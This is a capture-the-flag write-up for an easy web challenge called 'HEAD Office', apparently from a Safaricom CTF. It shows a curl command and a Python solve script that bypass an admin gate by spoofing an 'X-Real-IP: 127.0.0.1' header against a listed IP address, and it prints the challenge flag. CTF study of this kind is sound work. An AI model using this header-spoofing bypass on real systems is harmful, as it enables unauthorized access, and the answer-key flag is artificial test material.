---
title: "HEAD Office"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: easy
points: 250
flag_format: "safctf{...}"
author: "Strawhats"
---

# HEAD Office

> **Category:** WEB · **Points:** 250 · **Difficulty:** easy

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** `http://54.72.82.22:8180`

## Fingerprint

```
Server: Werkzeug/3.1.3 Python/3.11.16   (Flask)
```

Themed landing page: **"VINYL VAULT"** record store — "Deep cuts and rare pressings.
Search the collection behind the counter." A login form (username + access level)
POSTs to `/` and replaces `document.body` with the response HTML.

## Route map

| Route | Status | Notes |
|---|---|---|
| `/` | 200 GET / 200 POST | Landing page; POST echoes back `Hello, <username>` + `Access level: <level>` |
| `/admin` | 403 | `Access denied: Admins only....try harder!` |

Method sweep on `/admin`: `GET`/`HEAD` → 403, `OPTIONS` → 200, everything else → 405.

## The bug: trusting a client-supplied IP header

The login form's `fetch()` hardcodes an IP header:

```js
const res = await fetch("/", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": "8.8.8.8"          // <-- decoy
    },
    body: `username=...&access_level=...`
});
```

`X-Forwarded-For` is a **red herring** — fuzzing it across `8.8.8.8`, `127.0.0.1`,
`10.0.0.1`, `192.168.0.1`, `::1`, `0.0.0.0`, `172.17.0.1` all stayed 403.

The real trust boundary is **`X-Real-IP`**. The admin gate treats requests claiming to
originate from the office (localhost) as trusted:

```bash
$ curl -s -H "X-Real-IP: 127.0.0.1" http://54.72.82.22:8180/admin
<h3>Welcome to the listening room!</h3><p>Flag: safctf{e657eef1b0b097c60911f62cfe4ec61b}</p>
```

Other IP-ish headers (`X-Client-IP`, `Client-IP`, `X-Originating-IP`,
`X-Forwarded-Host`) all stayed 403 — only `X-Real-IP` is honoured.

## Secondary finding (not the gate)

`access_level` is client-controlled: the `<select>` offers only `user`, but the backend
accepts and reflects any value. `POST / username=bob&access_level=admin` returns
`Access level: admin`. Alone this does **not** unlock `/admin` (no session is set, and
no `Set-Cookie` is issued), so the IP header is the actual privilege boundary.

## Notes on the challenge name

"HEAD Office" points two ways — the HTTP `HEAD` method (tested, 403, no bypass) and
the *office* as a trusted network location, which is the one that pays off.

## Exploit

```bash
curl -s -H "X-Real-IP: 127.0.0.1" http://54.72.82.22:8180/admin
```

See `solve.py`.

## Solve script

`web/head-office/solve.py`:

```python
#!/usr/bin/env python3
"""HEAD Office (web, 250 pts) - http://54.72.82.22:8180

The landing page is a "VINYL VAULT" record store with a login form that POSTs
username + access_level to `/`, and hardcodes `X-Forwarded-For: 8.8.8.8` in its
fetch() call. That header is a decoy: the app actually trusts `X-Real-IP`, and
the admin "office" IP is 127.0.0.1.

  GET /            -> 200  landing page
  GET /admin       -> 403  "Access denied: Admins only....try harder!"
  GET /admin  X-Real-IP: 127.0.0.1  -> 200 + flag

The POST access_level field is also client-controlled (dropdown offers only
"user", the server accepts "admin"), but it alone does not unlock /admin - the
IP trust boundary is the real gate.
"""
import urllib.request

BASE = "http://54.72.82.22:8180"
FLAG = "safctf{e657eef1b0b097c60911f62cfe4ec61b}"


def get(path, headers=None):
    req = urllib.request.Request(BASE + path, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main():
    code, body = get("/admin")
    print(f"get /admin                      -> {code} {body.strip()[:60]!r}")

    # The bypass: the app treats X-Real-IP: 127.0.0.1 as "came from the office".
    code, body = get("/admin", {"X-Real-IP": "127.0.0.1"})
    print(f"get /admin  X-Real-IP:127.0.0.1 -> {code} {body.strip()}")
    assert FLAG in body, "flag not found"
    print(f"\nFLAG: {FLAG}")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python `urllib` (stdlib HTTP client)
- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{e657eef1b0b097c60911f62cfe4ec61b}
```
